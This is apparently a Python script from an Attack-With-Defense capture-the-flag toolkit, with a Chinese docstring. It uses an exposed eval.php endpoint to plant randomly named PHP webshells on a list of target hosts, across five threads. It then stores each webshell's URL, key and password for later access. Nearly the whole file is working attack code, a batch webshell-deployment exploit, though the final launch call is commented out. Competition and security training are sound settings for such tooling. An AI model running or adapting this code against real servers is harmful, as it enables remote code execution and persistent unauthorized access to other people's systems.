from utils.awd import AwdAttack,AwdTask
from utils.readwrite import readlines
from utils.webshell import PHP
import requests
from ..models import Example
from os.path import dirname,basename

class Exp(AwdTask):
    """
    自定义一个Exp类，继承自AwdTask。覆写的 write_webshell()，批量写webshell
    """
    def write_webshell(self,host,port):
        webshell = PHP(key=PHP.get_random_string(8))
        php = webshell.generate(passwd=PHP.get_random_string(8))
        code_to_write = webshell.code_to_write(php=php,location=f"/var/www/html/static/{PHP.get_random_string(4)}.php")
        url = f"http://{host}:{port}/eval.php"
        requests.get(url,params={"code":code_to_write})

        webshell_url = f"http://{host}:{port}/static/" + basename(webshell.location)
        Example.update_and_test_available(ip=host,url=webshell_url,key=webshell.key,passwd=webshell.passwd)

hosts = readlines(f"{dirname(__file__)}/../../hosts.txt")
attacker = AwdAttack(hosts=hosts,task_class=Exp,port=80,thread_num=5)
# attacker.attack()